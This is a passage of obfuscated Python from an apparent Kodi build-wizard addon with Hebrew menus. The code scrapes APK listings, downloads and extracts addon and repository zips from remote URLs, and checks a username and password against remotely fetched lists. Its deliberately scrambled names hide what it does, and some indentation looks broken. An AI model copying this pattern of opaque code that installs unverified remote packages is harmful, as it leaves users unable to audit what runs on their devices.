				O00O00O00O00OO00O ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0000OOO0OO0O00 [0 ].title (),O0O0000OOO0OO0O00 [1 ],OO0OOOO00O0O0000O .upper (),O0OOOOOOOOOOOOO00 ,COLOR2 ,OO0000O00OOO00O00 .replace (' ',''),COLOR1 ,OOOOOO0O000OOOOO0 )#line:2779
				O0O00OOOOOOO0O0OO =urljoin (O0OOOOOOO0O0OO0O0 ,O0000OOOOO0O0O000 )#line:2780
				addFile (O00O00O00O00OO00O ,'apkinstall',"%s v%s%s %s"%(O0O0000OOO0OO0O00 [0 ].title (),O0O0000OOO0OO0O00 [1 ],OO0OOOO00O0O0000O .upper (),O0OOOOOOOOOOOOO00 ),O0O00OOOOOOO0O0OO )#line:2781
				OOO00OOOO0O0O0000 +=1 #line:2782
			except :#line:2783
				wiz .log ("Error on: %s"%name )#line:2784
		for O0000OOOOO0O0O000 ,name ,OO0000O00OOO00O00 ,OOOOOO0O000OOOOO0 in OO0OOO0O00OO0OO00 :#line:2786
			if O0000OOOOO0O0O000 in ['../','old/']:continue #line:2787
			if not O0000OOOOO0O0O000 .endswith ('.apk'):continue #line:2788
			if not O0000OOOOO0O0O000 .find ('_')==-1 :continue #line:2789
			try :#line:2790
				O0O0000OOO0OO0O00 =name .split ('-')#line:2791
				O00O00O00O00OO00O ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0000OOO0OO0O00 [0 ].title (),O0O0000OOO0OO0O00 [1 ],O0O0000OOO0OO0O00 [2 ],COLOR2 ,OO0000O00OOO00O00 .replace (' ',''),COLOR1 ,OOOOOO0O000OOOOO0 )#line:2792
				O0O00OOOOOOO0O0OO =urljoin (OO00OO0O000O00O0O ,O0000OOOOO0O0O000 )#line:2793
				addFile (O00O00O00O00OO00O ,'apkinstall',"%s v%s %s"%(O0O0000OOO0OO0O00 [0 ].title (),O0O0000OOO0OO0O00 [1 ],O0O0000OOO0OO0O00 [2 ]),O0O00OOOOOOO0O0OO )#line:2794
				OOO00OOOO0O0O0000 +=1 #line:2795
			except :#line:2796
				wiz .log ("Error on: %s"%name )#line:2797
		if OOO00OOOO0O0O0000 ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2798
	elif name =='spmc':#line:2799
		OOO00O0OOO0OO0000 ='https://github.com/koying/SPMC/releases'#line:2800
		OOO00OO0O0000OO00 =wiz .openURL (OOO00O0OOO0OO0000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2801
		OOO00OOOO0O0O0000 =0 #line:2802
		O00OO0OOO00000O00 =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (OOO00OO0O0000OO00 )#line:2803
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2805
		for name ,O0OO0O0O0O0O0000O in O00OO0OOO00000O00 :#line:2807
			OOO0O000OO00OO00O =''#line:2808
			OO0OOO0O00OO0OO00 =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (O0OO0O0O0O0O0000O )#line:2809
			for OOOO0OO0O00O0OOO0 ,OOO0O0OO00O0000O0 ,OO00OO00OOO00OO0O in OO0OOO0O00OO0OO00 :#line:2810
				if OO00OO00OOO00OO0O .find ('armeabi')==-1 :continue #line:2811
				if OO00OO00OOO00OO0O .find ('launcher')>-1 :continue #line:2812
				OOO0O000OO00OO00O =urljoin ('https://github.com',OOOO0OO0O00O0OOO0 )#line:2813
				break #line:2814
		if OOO00OOOO0O0O0000 ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2816
def apkMenu (url =None ):#line:2818
	if url ==None :#line:2819
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2822
	if not APKFILE =='http://':#line:2823
		if url ==None :#line:2824
			OO0O0OO000O0000OO =wiz .workingURL (APKFILE )#line:2825
			OOOOO0O0000000OOO =uservar .APKFILE #line:2826
		else :#line:2827
			OO0O0OO000O0000OO =wiz .workingURL (url )#line:2828
			OOOOO0O0000000OOO =url #line:2829
		if OO0O0OO000O0000OO ==True :#line:2830
			O0OO0O0O0O000OOO0 =wiz .openURL (OOOOO0O0000000OOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2831
			OO0O000OOO000OOO0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0OO0O0O0O000OOO0 )#line:2832
			if len (OO0O000OOO000OOO0 )>0 :#line:2833
				O00OOO000OOO0OOO0 =0 #line:2834
				for OOO0OOO00O0OOOO0O ,O0O0OOOO000000O00 ,url ,OOOOOOO00O0OOOO0O ,O000000000OOO0O00 ,O0000O0O00000OO0O ,O0O0O0O0OOOO00O0O in OO0O000OOO000OOO0 :#line:2835
					if not SHOWADULT =='true'and O0000O0O00000OO0O .lower ()=='yes':continue #line:2836
					if O0O0OOOO000000O00 .lower ()=='yes':#line:2837
						O00OOO000OOO0OOO0 +=1 #line:2838
						addDir ("[B]%s[/B]"%OOO0OOO00O0OOOO0O ,'apk',url ,description =O0O0O0O0OOOO00O0O ,icon =OOOOOOO00O0OOOO0O ,fanart =O000000000OOO0O00 ,themeit =THEME3 )#line:2839
					else :#line:2840
						O00OOO000OOO0OOO0 +=1 #line:2841
						addFile (OOO0OOO00O0OOOO0O ,'apkinstall',OOO0OOO00O0OOOO0O ,url ,description =O0O0O0O0OOOO00O0O ,icon =OOOOOOO00O0OOOO0O ,fanart =O000000000OOO0O00 ,themeit =THEME2 )#line:2842
					if O00OOO000OOO0OOO0 <1 :#line:2843
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2844
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2845
		else :#line:2846
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2847
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2848
			addFile ('%s'%OO0O0OO000O0000OO ,'',themeit =THEME3 )#line:2849
		return #line:2850
	else :wiz .log ("[APK Menu] No APK list added.")#line:2851
	setView ('files','viewType')#line:2852
def addonMenu (url =None ):#line:2854
	if not ADDONFILE =='http://':#line:2855
		if url ==None :#line:2856
			OO0OO0O000000OO0O =wiz .workingURL (ADDONFILE )#line:2857
			OOO00000O0O000O0O =uservar .ADDONFILE #line:2858
		else :#line:2859
			OO0OO0O000000OO0O =wiz .workingURL (url )#line:2860
			OOO00000O0O000O0O =url #line:2861
		if OO0OO0O000000OO0O ==True :#line:2862
			OOO000O0O000O000O =wiz .openURL (OOO00000O0O000O0O ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2863
			OOOOOOO00O0OO0OO0 =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOO000O0O000O000O )#line:2864
			if len (OOOOOOO00O0OO0OO0 )>0 :#line:2865
				O0O0O00OOOOO000O0 =0 #line:2866
				for O0O0O0OO0OOOOOO0O ,O00OOOO0O0OO0000O ,url ,O00O0000O0OO0OO0O ,OOO000000O0OO0000 ,OOOO0000O0OOOOOO0 ,OO00OOOOOO0OOO00O ,OOO0OOO0O00OOOOOO ,OOO00O0O00O000OOO ,OO00OOO0OO0O000O0 in OOOOOOO00O0OO0OO0 :#line:2867
					if O00OOOO0O0OO0000O .lower ()=='section':#line:2868
						O0O0O00OOOOO000O0 +=1 #line:2869
						addDir ("[B]%s[/B]"%O0O0O0OO0OOOOOO0O ,'addons',url ,description =OO00OOO0OO0O000O0 ,icon =OO00OOOOOO0OOO00O ,fanart =OOO0OOO0O00OOOOOO ,themeit =THEME3 )#line:2870
					else :#line:2871
						if not SHOWADULT =='true'and OOO00O0O00O000OOO .lower ()=='yes':continue #line:2872
						try :#line:2873
							OOOO0O00O000O00O0 =xbmcaddon .Addon (id =O00OOOO0O0OO0000O ).getAddonInfo ('path')#line:2874
							if os .path .exists (OOOO0O00O000O00O0 ):#line:2875
								O0O0O0OO0OOOOOO0O ="[COLOR green][Installed][/COLOR] %s"%O0O0O0OO0OOOOOO0O #line:2876
						except :#line:2877
							pass #line:2878
						O0O0O00OOOOO000O0 +=1 #line:2879
						addFile (O0O0O0OO0OOOOOO0O ,'addoninstall',O00OOOO0O0OO0000O ,OOO00000O0O000O0O ,description =OO00OOO0OO0O000O0 ,icon =OO00OOOOOO0OOO00O ,fanart =OOO0OOO0O00OOOOOO ,themeit =THEME2 )#line:2880
					if O0O0O00OOOOO000O0 <1 :#line:2881
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2882
			else :#line:2883
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2884
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2885
		else :#line:2886
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2887
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2888
			addFile ('%s'%OO0OO0O000000OO0O ,'',themeit =THEME3 )#line:2889
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2890
	setView ('files','viewType')#line:2891
def addonInstaller (OOOO00O000O0OO00O ,O0OOO0O0OO000OOOO ):#line:2893
	if not ADDONFILE =='http://':#line:2894
		OO0000OO00O00OO00 =wiz .workingURL (O0OOO0O0OO000OOOO )#line:2895
		if OO0000OO00O00OO00 ==True :#line:2896
			OOO000O0O0O0OO0O0 =wiz .openURL (O0OOO0O0OO000OOOO ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2897
			OOOOO0O0O000O00O0 =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OOOO00O000O0OO00O ).findall (OOO000O0O0O0OO0O0 )#line:2898
			if len (OOOOO0O0O000O00O0 )>0 :#line:2899
				for O0O00OO000O0O000O ,O0OOO0O0OO000OOOO ,OOO0000O0O0000O0O ,O0O000O00000OOOO0 ,OO00OOOOO00OO0000 ,O0OO0000O00OOOO00 ,OOOOOOOOOO0O0O00O ,O0O0OOOO0O0OO000O ,O0O00O0O000OOOO00 in OOOOO0O0O000O00O0 :#line:2900
					if os .path .exists (os .path .join (ADDONS ,OOOO00O000O0OO00O )):#line:2901
						O0OOOOOO0OO00000O =['Launch Addon','Remove Addon']#line:2902
						O0000O00OOOO0O0OO =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,O0OOOOOO0OO00000O )#line:2903
						if O0000O00OOOO0O0OO ==0 :#line:2904
							wiz .ebi ('RunAddon(%s)'%OOOO00O000O0OO00O )#line:2905
							xbmc .sleep (1000 )#line:2906
							return True #line:2907
						elif O0000O00OOOO0O0OO ==1 :#line:2908
							wiz .cleanHouse (os .path .join (ADDONS ,OOOO00O000O0OO00O ))#line:2909
							try :wiz .removeFolder (os .path .join (ADDONS ,OOOO00O000O0OO00O ))#line:2910
							except :pass #line:2911
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OOOO00O000O0OO00O ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2912
								removeAddonData (OOOO00O000O0OO00O )#line:2913
							wiz .refresh ()#line:2914
							return True #line:2915
						else :#line:2916
							return False #line:2917
					OO000OO0O000000OO =os .path .join (ADDONS ,OOO0000O0O0000O0O )#line:2918
					if not OOO0000O0O0000O0O .lower ()=='none'and not os .path .exists (OO000OO0O000000OO ):#line:2919
						wiz .log ("Repository not installed, installing it")#line:2920
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,OOOO00O000O0OO00O ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OOO0000O0O0000O0O ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2921
							O000O0OO0OOOO0OOO =wiz .parseDOM (wiz .openURL (O0O000O00000OOOO0 ),'addon',ret ='version',attrs ={'id':OOO0000O0O0000O0O })#line:2922
							if len (O000O0OO0OOOO0OOO )>0 :#line:2923
								O0O00OO0OO0OO00O0 ='%s%s-%s.zip'%(OO00OOOOO00OO0000 ,OOO0000O0O0000O0O ,O000O0OO0OOOO0OOO [0 ])#line:2924
								wiz .log (O0O00OO0OO0OO00O0 )#line:2925
								if KODIV >=17 :wiz .addonDatabase (OOO0000O0O0000O0O ,1 )#line:2926
								installAddon (OOO0000O0O0000O0O ,O0O00OO0OO0OO00O0 )#line:2927
								wiz .ebi ('UpdateAddonRepos()')#line:2928
								wiz .log ("Installing Addon from Kodi")#line:2930
								OOO000O0OOO0000O0 =installFromKodi (OOOO00O000O0OO00O )#line:2931
								wiz .log ("Install from Kodi: %s"%OOO000O0OOO0000O0 )#line:2932
								if OOO000O0OOO0000O0 :#line:2933
									wiz .refresh ()#line:2934
									return True #line:2935
							else :#line:2936
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%OOO0000O0O0000O0O )#line:2937
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(OOOO00O000O0OO00O ,OOO0000O0O0000O0O ))#line:2938
					elif OOO0000O0O0000O0O .lower ()=='none':#line:2939
						wiz .log ("No repository, installing addon")#line:2940
						OO00OOO0000OO0000 =OOOO00O000O0OO00O #line:2941
						OO00O0000OOO0OO0O =O0OOO0O0OO000OOOO #line:2942
						installAddon (OOOO00O000O0OO00O ,O0OOO0O0OO000OOOO )#line:2943
						wiz .refresh ()#line:2944
						return True #line:2945
					else :#line:2946
						wiz .log ("Repository installed, installing addon")#line:2947
						OOO000O0OOO0000O0 =installFromKodi (OOOO00O000O0OO00O ,False )#line:2948
						if OOO000O0OOO0000O0 :#line:2949
							wiz .refresh ()#line:2950
							return True #line:2951
					if os .path .exists (os .path .join (ADDONS ,OOOO00O000O0OO00O )):return True #line:2952
					O00O0OOOO00O0OO00 =wiz .parseDOM (wiz .openURL (O0O000O00000OOOO0 ),'addon',ret ='version',attrs ={'id':OOOO00O000O0OO00O })#line:2953
					if len (O00O0OOOO00O0OO00 )>0 :#line:2954
						O0OOO0O0OO000OOOO ="%s%s-%s.zip"%(O0OOO0O0OO000OOOO ,OOOO00O000O0OO00O ,O00O0OOOO00O0OO00 [0 ])#line:2955
						wiz .log (str (O0OOO0O0OO000OOOO ))#line:2956
						if KODIV >=17 :wiz .addonDatabase (OOOO00O000O0OO00O ,1 )#line:2957
						installAddon (OOOO00O000O0OO00O ,O0OOO0O0OO000OOOO )#line:2958
						wiz .refresh ()#line:2959
					else :#line:2960
						wiz .log ("no match");return False #line:2961
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2962
		else :wiz .log ("[Addon Installer] Text File: %s"%OO0000OO00O00OO00 )#line:2963
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2964
def installFromKodi (OO0O00O0O00O000OO ,over =True ):#line:2966
	if over ==True :#line:2967
		xbmc .sleep (2000 )#line:2968
	wiz .ebi ('RunPlugin(plugin://%s)'%OO0O00O0O00O000OO )#line:2970
	if not wiz .whileWindow ('yesnodialog'):#line:2971
		return False #line:2972
	xbmc .sleep (1000 )#line:2973
	if wiz .whileWindow ('okdialog'):#line:2974
		return False #line:2975
	wiz .whileWindow ('progressdialog')#line:2976
	if os .path .exists (os .path .join (ADDONS ,OO0O00O0O00O000OO )):return True #line:2977
	else :return False #line:2978
def installAddon (O000OOO00O00O0O0O ,OOO0O0O0O00O0000O ):#line:2980
	if not wiz .workingURL (OOO0O0O0O00O0000O )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,O000OOO00O00O0O0O ,COLOR2 ));return #line:2981
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2982
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000OOO00O00O0O0O ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2983
	OOO00OO000O00O0O0 =OOO0O0O0O00O0000O .split ('/')#line:2984
	O0000OO00OO000OO0 =os .path .join (PACKAGES ,OOO00OO000O00O0O0 [-1 ])#line:2985
	try :os .remove (O0000OO00OO000OO0 )#line:2986
	except :pass #line:2987
	downloader .download (OOO0O0O0O00O0000O ,O0000OO00OO000OO0 ,DP )#line:2988
	OOO0OOO0O0O00O0O0 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000OOO00O00O0O0O )#line:2989
	DP .update (0 ,OOO0OOO0O0O00O0O0 ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2990
	OO0OO00OO00O0OOO0 ,O0O0000OOO0O0O0OO ,O0O000OOO0O00OOO0 =extract .all (O0000OO00OO000OO0 ,ADDONS ,DP ,title =OOO0OOO0O0O00O0O0 )#line:2991
	DP .update (0 ,OOO0OOO0O0O00O0O0 ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2992
	installed (O000OOO00O00O0O0O )#line:2993
	installDep (O000OOO00O00O0O0O ,DP )#line:2994
	DP .close ()#line:2995
	wiz .ebi ('UpdateAddonRepos()')#line:2996
	wiz .ebi ('UpdateLocalAddons()')#line:2997
	wiz .refresh ()#line:2998
def installDep (OO0000OOO0OO00OO0 ,DP =None ):#line:3000
	OO0O00OO0OOOOOO00 =os .path .join (ADDONS ,OO0000OOO0OO00OO0 ,'addon.xml')#line:3001
	if os .path .exists (OO0O00OO0OOOOOO00 ):#line:3002
		O0O00O0O00OOOO0OO =open (OO0O00OO0OOOOOO00 ,mode ='r');OOO000O0O00O0O0O0 =O0O00O0O00OOOO0OO .read ();O0O00O0O00OOOO0OO .close ();#line:3003
		OO0O000O00OOO0OOO =wiz .parseDOM (OOO000O0O00O0O0O0 ,'import',ret ='addon')#line:3004
		for OOOOO00O0O0OOO0OO in OO0O000O00OOO0OOO :#line:3005
			if not 'xbmc.python'in OOOOO00O0O0OOO0OO :#line:3006
				if not DP ==None :#line:3007
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOOOO00O0O0OOO0OO ))#line:3008
				wiz .createTemp (OOOOO00O0O0OOO0OO )#line:3009
def installed (O000O0O0OOOOO0OOO ):#line:3036
	OOOO000OOO0O000OO =os .path .join (ADDONS ,O000O0O0OOOOO0OOO ,'addon.xml')#line:3037
	if os .path .exists (OOOO000OOO0O000OO ):#line:3038
		try :#line:3039
			O0O0OOO0O00OOOO0O =open (OOOO000OOO0O000OO ,mode ='r');O00OOOOOOOOO0O00O =O0O0OOO0O00OOOO0O .read ();O0O0OOO0O00OOOO0O .close ()#line:3040
			O00OO00O0000O0OOO =wiz .parseDOM (O00OOOOOOOOO0O00O ,'addon',ret ='name',attrs ={'id':O000O0O0OOOOO0OOO })#line:3041
			O00OO000O0O000000 =os .path .join (ADDONS ,O000O0O0OOOOO0OOO ,'icon.png')#line:3042
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,O00OO00O0000O0OOO [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',O00OO000O0O000000 )#line:3043
		except :pass #line:3044
def youtubeMenu (url =None ):#line:3046
	if not YOUTUBEFILE =='http://':#line:3047
		if url ==None :#line:3048
			O0000OOOOOOO0O00O =wiz .workingURL (YOUTUBEFILE )#line:3049
			O00O00O0OO0O0000O =uservar .YOUTUBEFILE #line:3050
		else :#line:3051
			O0000OOOOOOO0O00O =wiz .workingURL (url )#line:3052
			O00O00O0OO0O0000O =url #line:3053
		if O0000OOOOOOO0O00O ==True :#line:3054
			OO0OOOO0OO000O00O =wiz .openURL (O00O00O0OO0O0000O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:3055
			OOOO0OO0OOO0O0OOO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OO0OOOO0OO000O00O )#line:3056
			if len (OOOO0OO0OOO0O0OOO )>0 :#line:3057
				for OO0OOO0OO000O0000 ,O000O000OO0000000 ,url ,O0O0000OOO0000000 ,OO000O0OOO000O000 ,OOOO00O00000O00OO in OOOO0OO0OOO0O0OOO :#line:3058
					if O000O000OO0000000 .lower ()=="yes":#line:3059
						addDir ("[B]%s[/B]"%OO0OOO0OO000O0000 ,'youtube',url ,description =OOOO00O00000O00OO ,icon =O0O0000OOO0000000 ,fanart =OO000O0OOO000O000 ,themeit =THEME3 )#line:3060
					else :#line:3061
						addFile (OO0OOO0OO000O0000 ,'viewVideo',url =url ,description =OOOO00O00000O00OO ,icon =O0O0000OOO0000000 ,fanart =OO000O0OOO000O000 ,themeit =THEME2 )#line:3062
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:3063
		else :#line:3064
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:3065
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:3066
			addFile ('%s'%O0000OOOOOOO0O00O ,'',themeit =THEME3 )#line:3067
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:3068
	setView ('files','viewType')#line:3069
def STARTP ():#line:3070
	OOOO0O00000OO00O0 =(ADDON .getSetting ("pass"))#line:3071
	if BUILDNAME =="":#line:3072
	 if not NOTIFY =='true':#line:3073
          O0OO0O00O0OOO0O00 =wiz .workingURL (NOTIFICATION )#line:3074
	 if not NOTIFY2 =='true':#line:3075
          O0OO0O00O0OOO0O00 =wiz .workingURL (NOTIFICATION2 )#line:3076
	 if not NOTIFY3 =='true':#line:3077
          O0OO0O00O0OOO0O00 =wiz .workingURL (NOTIFICATION3 )#line:3078
	OOOO0O0O0000000OO =OOOO0O00000OO00O0 #line:3079
	O0OO0O00O0OOO0O00 =urllib2 .Request (SPEED )#line:3080
	O00OO0O000000OO00 =urllib2 .urlopen (O0OO0O00O0OOO0O00 )#line:3081
	OOOOO00O00O0O00OO =O00OO0O000000OO00 .readlines ()#line:3083
	O0OO000O0OO0O0OO0 =0 #line:3087
	for O0O0O0O0O0OOO00OO in OOOOO00O00O0O00OO :#line:3088
		if O0O0O0O0O0OOO00OO .split (' ==')[0 ]==OOOO0O00000OO00O0 or O0O0O0O0O0OOO00OO .split ()[0 ]==OOOO0O00000OO00O0 :#line:3089
			O0OO000O0OO0O0OO0 =1 #line:3090
			break #line:3091
	if O0OO000O0OO0O0OO0 ==0 :#line:3092
					OOO0O0000O00O000O =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:3093
					if OOO0O0000O00O000O :#line:3095
						ADDON .openSettings ()#line:3097
						sys .exit ()#line:3099
					else :#line:3100
						sys .exit ()#line:3101
	return 'ok'#line:3105
def STARTP2 ():#line:3106
	O0O00OOO0OO00O00O =(ADDON .getSetting ("user"))#line:3107
	O00000OOOO00OO0OO =(UNAME )#line:3109
	O00O00000000O0O00 =urllib2 .urlopen (O00000OOOO00OO0OO )#line:3110
	OO0OOOOO0OO000O0O =O00O00000000O0O00 .readlines ()#line:3111
	O0O0O0O000O0000OO =0 #line:3112
	for O00OO0OO00OOO0O0O in OO0OOOOO0OO000O0O :#line:3115
		if O00OO0OO00OOO0O0O .split (' ==')[0 ]==O0O00OOO0OO00O00O or O00OO0OO00OOO0O0O .split ()[0 ]==O0O00OOO0OO00O00O :#line:3116
			O0O0O0O000O0000OO =1 #line:3117
			break #line:3118
	if O0O0O0O000O0000OO ==0 :#line:3119
		OO0OO000O0O0000OO =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:3120
		if OO0OO000O0O0000OO :#line:3122
			ADDON .openSettings ()#line:3124
			sys .exit ()#line:3127
		else :#line:3128
			sys .exit ()#line:3129
	return 'ok'#line:3133
def passandpin ():#line:3134
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:3135
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:3136
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:3137
def passandUsername ():#line:3138
	ADDON .openSettings ()#line:3140
def folderback ():#line:3143
    O00OO0O0O0000O0OO =ADDON .getSetting ("path")#line:3144
    if O00OO0O0O0000O0OO :#line:3145
      O00OO0O0O0000O0OO =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:3146
      ADDON .setSetting ("path",O00OO0O0O0000O0OO )#line:3147
def backmyupbuild ():#line:3150
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:3154
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:3155
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:3156
		addFile ('גיבוי הגדרות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3159
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:3160
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3162
def maintMenu (view =None ):#line:3166
	O0OO0000OOOOOOOOO ='[B][COLOR green]ON[/COLOR][/B]';OO00OO0O00OOOOOO0 ='[B][COLOR red]OFF[/COLOR][/B]'#line:3168
	OOO0OOO000O00OO0O ='true'if AUTOCLEANUP =='true'else 'false'#line:3169
	OO000O00O0000O00O ='true'if AUTOCACHE =='true'else 'false'#line:3170
	O0O000000OOO0OO00 ='true'if AUTOPACKAGES =='true'else 'false'#line:3171
	O000OO0O000OOO000 ='true'if AUTOTHUMBS =='true'else 'false'#line:3172
	OOOOOOO0O0OO0OO0O ='true'if SHOWMAINT =='true'else 'false'#line:3173
	OO00O0O000OO00O0O ='true'if INCLUDEVIDEO =='true'else 'false'#line:3174
	OO0OOO0OO0OOOOO0O ='true'if INCLUDEALL =='true'else 'false'#line:3175
	OO0O000OOO00000OO ='true'if THIRDPARTY =='true'else 'false'#line:3176
	if wiz .Grab_Log (True )==False :O0OO0OOOOO0OOO000 =0 #line:3177
	else :O0OO0OOOOO0OOO000 =errorChecking (wiz .Grab_Log (True ),True ,True )#line:3178
	if wiz .Grab_Log (True ,True )==False :OO000OO0O0OOO000O =0 #line:3179
	else :OO000OO0O0OOO000O =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:3180
	OO0OO0OOOOO0O0OOO =int (O0OO0OOOOO0OOO000 )+int (OO000OO0O0OOO000O )#line:3181
	O00000000OO0OOOOO =str (OO0OO0OOOOO0O0OOO )+' Error(s) Found'if OO0OO0OOOOO0O0OOO >0 else 'None Found'#line:3182
	OO0O0O0000OOO0O0O =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:3183
	if OO0OOO0OO0OOOOO0O =='true':#line:3184
		OO00OO0O00OOOOOOO ='true'#line:3185
		OOOOOOOO0OOO00OO0 ='true'#line:3186
		O0O00000000O0OOO0 ='true'#line:3187
		OOO0O0OOOOOOOOOOO ='true'#line:3188
		OO0O0O0O0000OOOOO ='true'#line:3189
		OOOO0O00000000OOO ='true'#line:3190
		OOOOOOOOOO000OO00 ='true'#line:3191
		O0O0OOO0OO000OOOO ='true'#line:3192
	else :#line:3193
		OO00OO0O00OOOOOOO ='true'if INCLUDEBOB =='true'else 'false'#line:3194
		OOOOOOOO0OOO00OO0 ='true'if INCLUDEPHOENIX =='true'else 'false'#line:3195
		O0O00000000O0OOO0 ='true'if INCLUDESPECTO =='true'else 'false'#line:3196
		OOO0O0OOOOOOOOOOO ='true'if INCLUDEGENESIS =='true'else 'false'#line:3197
		OO0O0O0O0000OOOOO ='true'if INCLUDEEXODUS =='true'else 'false'#line:3198
		OOOO0O00000000OOO ='true'if INCLUDEONECHAN =='true'else 'false'#line:3199
